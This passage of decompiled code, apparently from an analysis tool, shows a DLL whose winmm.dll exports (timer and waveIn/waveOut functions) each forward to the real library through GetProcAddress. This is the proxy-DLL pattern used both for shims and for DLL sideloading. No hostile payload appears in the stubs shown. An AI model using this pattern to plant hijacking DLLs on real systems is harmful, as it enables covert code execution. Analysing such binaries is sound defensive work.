    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180003d24. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(pszSound,CONCAT44(in_register_00000014,fuSound));
      return (BOOL)IVar1;
    }
  }
  return 0;
}



/* 0x180003d33 timeBeginPeriod; Evidence ev_295656339a7331c412f19ecf0ab801bcf5c10c2cc7a5f02172184cadb0122605 */

MMRESULT __stdcall timeBeginPeriod(UINT uPeriod)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_0000000c;
  
                    /* 0x3d33  153  timeBeginPeriod */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"timeBeginPeriod");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180003d7b. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(CONCAT44(in_register_0000000c,uPeriod));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180003d8a timeEndPeriod; Evidence ev_6dbc5c95f0f6090a15977e17ee525077ebeef26983bad2d1e30e3f5ec7263229 */

MMRESULT __stdcall timeEndPeriod(UINT uPeriod)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_0000000c;
  
                    /* 0x3d8a  154  timeEndPeriod */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"timeEndPeriod");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180003dd2. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(CONCAT44(in_register_0000000c,uPeriod));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180003de1 timeGetDevCaps; Evidence ev_6ca6612c65ec9a0274c1af73623f7217c415d24abd3a8a2b2dba0d372bbae202 */

MMRESULT __stdcall timeGetDevCaps(LPTIMECAPS ptc,UINT cbtc)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000014;
  
                    /* 0x3de1  155  timeGetDevCaps */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"timeGetDevCaps");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180003e29. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(ptc,CONCAT44(in_register_00000014,cbtc));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180003e38 timeGetSystemTime; Evidence ev_53d33349af8341ffa105757eafd118e9a696774132514303b94ffe2a6879d787 */

MMRESULT __stdcall timeGetSystemTime(LPMMTIME pmmt,UINT cbmmt)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000014;
  
                    /* 0x3e38  156  timeGetSystemTime */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"timeGetSystemTime");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180003e80. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(pmmt,CONCAT44(in_register_00000014,cbmmt));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180003e8f timeGetTime; Evidence ev_cdbad73c74e2ee5be24b98978cf2c4273fc646daadf911f1ba7db86600a32412 */

DWORD __stdcall timeGetTime(void)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x3e8f  157  timeGetTime */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"timeGetTime");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180003ed7. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)();
      return (DWORD)IVar1;
    }
  }
  return 0;
}



/* 0x180003ee6 timeKillEvent; Evidence ev_22b4ad3d693647cb4f6c749e7b46b7c34c26d377e6214c457f502a9c418623ae */

MMRESULT __stdcall timeKillEvent(UINT uTimerID)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_0000000c;
  
                    /* 0x3ee6  158  timeKillEvent */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"timeKillEvent");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180003f2e. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(CONCAT44(in_register_0000000c,uTimerID));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180003f3d timeSetEvent; Evidence ev_019c1b5d6a989ec67d6d4c164e9221fa7c44390f2c4ae110b0f3a4f8f664c6f2 */

MMRESULT __stdcall
timeSetEvent(UINT uDelay,UINT uResolution,LPTIMECALLBACK fptc,DWORD_PTR dwUser,UINT fuEvent)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_0000000c;
  undefined4 in_register_00000014;
  
                    /* 0x3f3d  159  timeSetEvent */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"timeSetEvent");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180003f85. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)
                        (CONCAT44(in_register_0000000c,uDelay),
                         CONCAT44(in_register_00000014,uResolution),fptc,dwUser);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180003f94 waveInAddBuffer; Evidence ev_1b089da122d61a553688b0ebf6881ac818ea62691bd116aa9ebae87ae5e91d2f */

MMRESULT __stdcall waveInAddBuffer(HWAVEIN hwi,LPWAVEHDR pwh,UINT cbwh)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x3f94  160  waveInAddBuffer */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveInAddBuffer");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180003fdc. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hwi,pwh,CONCAT44(in_register_00000084,cbwh));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180003feb waveInClose; Evidence ev_4de96ec30fa0a053a1685065b9bd991b992e365dcf2ba4fd2c1dcee2b0e29689 */

MMRESULT __stdcall waveInClose(HWAVEIN hwi)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x3feb  161  waveInClose */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveInClose");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180004033. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hwi);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180004042 waveInGetDevCapsA; Evidence ev_f3f58ff87d54a52bc3f5f81b4d98b1d8c8b34239a943ca0129d023f8883edc9e */

MMRESULT __stdcall waveInGetDevCapsA(UINT_PTR uDeviceID,LPWAVEINCAPSA pwic,UINT cbwic)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x4042  162  waveInGetDevCapsA */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveInGetDevCapsA");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x00018000408a. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(uDeviceID,pwic,CONCAT44(in_register_00000084,cbwic));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180004099 waveInGetDevCapsW; Evidence ev_2dc3d30949ff4677ada300321969af6e197944e956129f99d66d1e748cce5961 */

MMRESULT __stdcall waveInGetDevCapsW(UINT_PTR uDeviceID,LPWAVEINCAPSW pwic,UINT cbwic)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x4099  163  waveInGetDevCapsW */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveInGetDevCapsW");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800040e1. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(uDeviceID,pwic,CONCAT44(in_register_00000084,cbwic));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x1800040f0 waveInGetErrorTextA; Evidence ev_601b60e21938398c857ed101e3b611636e1bbf883d870c5f498a27b7c4f39743 */

MMRESULT __stdcall waveInGetErrorTextA(MMRESULT mmrError,LPSTR pszText,UINT cchText)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_0000000c;
  undefined4 in_register_00000084;
  
                    /* 0x40f0  164  waveInGetErrorTextA */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveInGetErrorTextA");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180004138. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)
                        (CONCAT44(in_register_0000000c,mmrError),pszText,
                         CONCAT44(in_register_00000084,cchText));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180004147 waveInGetErrorTextW; Evidence ev_3c666e70e02cba3d97d0eca755fcc50efef687d904c46b9c56a5465b9f3e94d2 */

MMRESULT __stdcall waveInGetErrorTextW(MMRESULT mmrError,LPWSTR pszText,UINT cchText)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_0000000c;
  undefined4 in_register_00000084;
  
                    /* 0x4147  165  waveInGetErrorTextW */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveInGetErrorTextW");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x00018000418f. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)
                        (CONCAT44(in_register_0000000c,mmrError),pszText,
                         CONCAT44(in_register_00000084,cchText));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x18000419e waveInGetID; Evidence ev_cc8b4e266d3f8596929327c92f8e2b4861152cdb41547653d0c3a1fd14f864eb */

MMRESULT __stdcall waveInGetID(HWAVEIN hwi,LPUINT puDeviceID)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x419e  166  waveInGetID */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveInGetID");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800041e6. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hwi,puDeviceID);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x1800041f5 waveInGetNumDevs; Evidence ev_6aae882089c291eddac4f58fc9a7c6c2c6241693431492d06cfb0d45f4978cd4 */

UINT __stdcall waveInGetNumDevs(void)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x41f5  167  waveInGetNumDevs */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveInGetNumDevs");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x00018000423d. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)();
      return (UINT)IVar1;
    }
  }
  return 0;
}



/* 0x18000424c waveInGetPosition; Evidence ev_dccb5aafbd6fd38c36d52b1e1abaeda55bec6795e516c634f461c1a859b297a4 */

MMRESULT __stdcall waveInGetPosition(HWAVEIN hwi,LPMMTIME pmmt,UINT cbmmt)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x424c  168  waveInGetPosition */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveInGetPosition");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180004294. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hwi,pmmt,CONCAT44(in_register_00000084,cbmmt));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x1800042a3 waveInMessage; Evidence ev_d9988fd790e6f753bdade548dfbddb510b870e72ea1e8d2fa6ba773b1557fef1 */

MMRESULT __stdcall waveInMessage(HWAVEIN hwi,UINT uMsg,DWORD_PTR dw1,DWORD_PTR dw2)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000014;
  
                    /* 0x42a3  169  waveInMessage */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveInMessage");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800042eb. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hwi,CONCAT44(in_register_00000014,uMsg),dw1,dw2);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x1800042fa waveInOpen; Evidence ev_93a9677293fc021ae1b3cbd1b347c5a70be794c9200d3657f7779be54e574c72 */

MMRESULT __stdcall
waveInOpen(LPHWAVEIN phwi,UINT uDeviceID,LPCWAVEFORMATEX pwfx,DWORD_PTR dwCallback,
          DWORD_PTR dwInstance,DWORD fdwOpen)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000014;
  
                    /* 0x42fa  170  waveInOpen */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveInOpen");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180004342. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)
                        (phwi,CONCAT44(in_register_00000014,uDeviceID),pwfx,dwCallback);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180004351 waveInPrepareHeader; Evidence ev_731e41d1818b7fb450cc967434632b17272b9cfe8c939ad7943531751ac67dc5 */

MMRESULT __stdcall waveInPrepareHeader(HWAVEIN hwi,LPWAVEHDR pwh,UINT cbwh)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x4351  171  waveInPrepareHeader */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveInPrepareHeader");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180004399. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hwi,pwh,CONCAT44(in_register_00000084,cbwh));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x1800043a8 waveInReset; Evidence ev_534f302ffac8acfcd518adb6536f5c04711f3919c084fecb36dd02e24974dcfd */

MMRESULT __stdcall waveInReset(HWAVEIN hwi)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x43a8  172  waveInReset */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveInReset");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800043f0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hwi);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x1800043ff waveInStart; Evidence ev_48baf07726c98780d09989858a89755d5059df3e99db9ddef77748d9a8e2dee3 */

MMRESULT __stdcall waveInStart(HWAVEIN hwi)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x43ff  173  waveInStart */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveInStart");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180004447. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hwi);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180004456 waveInStop; Evidence ev_38e94eab8ad8f6a33fe89f91945d36b6746839c14a79d883274529f1daf4976e */

MMRESULT __stdcall waveInStop(HWAVEIN hwi)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x4456  174  waveInStop */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveInStop");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x00018000449e. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hwi);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x1800044ad waveInUnprepareHeader; Evidence ev_e3d8bc0028e9d723c71fb72b2f0eb797f2fa9e3356d15d43ac3f36f45850b0a9 */

MMRESULT __stdcall waveInUnprepareHeader(HWAVEIN hwi,LPWAVEHDR pwh,UINT cbwh)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x44ad  175  waveInUnprepareHeader */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveInUnprepareHeader");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800044f5. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hwi,pwh,CONCAT44(in_register_00000084,cbwh));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180004504 waveOutBreakLoop; Evidence ev_fef5b5acd8ccebddc3f0ab2362a5ebd3ab17766c4af0d9bd0802c30b39f7515a */

MMRESULT __stdcall waveOutBreakLoop(HWAVEOUT hwo)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x4504  176  waveOutBreakLoop */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveOutBreakLoop");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x00018000454c. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hwo);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x18000455b waveOutClose; Evidence ev_4a2cedd04d950b85597b01dc448f33ccb7f0f251f380f91bb8a6b3c2341ba437 */

MMRESULT __stdcall waveOutClose(HWAVEOUT hwo)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x455b  177  waveOutClose */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveOutClose");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800045a3. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hwo);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x1800045b2 waveOutGetDevCapsA; Evidence ev_75c28f7263c74549d52aa27df906e23adc1fe59251b797fdf4b31701177fb417 */

MMRESULT __stdcall waveOutGetDevCapsA(UINT_PTR uDeviceID,LPWAVEOUTCAPSA pwoc,UINT cbwoc)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x45b2  178  waveOutGetDevCapsA */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveOutGetDevCapsA");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800045fa. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(uDeviceID,pwoc,CONCAT44(in_register_00000084,cbwoc));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180004609 waveOutGetDevCapsW; Evidence ev_13210fa90c23f7c96ec91f01f9d06ee9dd704177c09710135a55352dc5b82570 */

MMRESULT __stdcall waveOutGetDevCapsW(UINT_PTR uDeviceID,LPWAVEOUTCAPSW pwoc,UINT cbwoc)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x4609  179  waveOutGetDevCapsW */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveOutGetDevCapsW");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180004651. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(uDeviceID,pwoc,CONCAT44(in_register_00000084,cbwoc));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180004660 waveOutGetErrorTextA; Evidence ev_4e3c73f44740d25ce1f363f56210daecab9b0469da08930b85a741eaf0236264 */

MMRESULT __stdcall waveOutGetErrorTextA(MMRESULT mmrError,LPSTR pszText,UINT cchText)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_0000000c;
  undefined4 in_register_00000084;
  
                    /* 0x4660  180  waveOutGetErrorTextA */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveOutGetErrorTextA");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800046a8. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)
                        (CONCAT44(in_register_0000000c,mmrError),pszText,
                         CONCAT44(in_register_00000084,cchText));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x1800046b7 waveOutGetErrorTextW; Evidence ev_9b6a02ad9ade8b9bc36c3d18213455eab96244acacde8d068441ac40bca9365f */

MMRESULT __stdcall waveOutGetErrorTextW(MMRESULT mmrError,LPWSTR pszText,UINT cchText)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_0000000c;
  undefined4 in_register_00000084;
  
                    /* 0x46b7  181  waveOutGetErrorTextW */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveOutGetErrorTextW");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800046ff. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)
                        (CONCAT44(in_register_0000000c,mmrError),pszText,
                         CONCAT44(in_register_00000084,cchText));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x18000470e waveOutGetID; Evidence ev_58435b56b454a8d124389ceb5d733e33311438200d2f73c78fb7bbad966bbe62 */

MMRESULT __stdcall waveOutGetID(HWAVEOUT hwo,LPUINT puDeviceID)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x470e  182  waveOutGetID */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveOutGetID");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180004756. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hwo,puDeviceID);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180004765 waveOutGetNumDevs; Evidence ev_9b988f76a38c190cbd41a183bdcc4175cd5d299b68136518436c9e074f97fd8c */

UINT __stdcall waveOutGetNumDevs(void)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x4765  183  waveOutGetNumDevs */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveOutGetNumDevs");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800047ad. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)();
      return (UINT)IVar1;
    }
  }
  return 0;
}



/* 0x1800047bc waveOutGetPitch; Evidence ev_aa369a24a23863d57f13e370471fb1d234f12feb19ef16e7d8ab116a164bc183 */

MMRESULT __stdcall waveOutGetPitch(HWAVEOUT hwo,LPDWORD pdwPitch)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x47bc  184  waveOutGetPitch */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveOutGetPitch");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180004804. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hwo,pdwPitch);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180004813 waveOutGetPlaybackRate; Evidence ev_40cf07b28934b9ef57234e126387fa724c9e61a99d98c47601ffe2700247c3bf */

MMRESULT __stdcall waveOutGetPlaybackRate(HWAVEOUT hwo,LPDWORD pdwRate)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x4813  185  waveOutGetPlaybackRate */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveOutGetPlaybackRate");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x00018000485b. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hwo,pdwRate);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x18000486a waveOutGetPosition; Evidence ev_1f04647a40093701baade97fb4f9c64a3526a258d599cd29dd89595410103aa4 */

MMRESULT __stdcall waveOutGetPosition(HWAVEOUT hwo,LPMMTIME pmmt,UINT cbmmt)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x486a  186  waveOutGetPosition */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveOutGetPosition");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
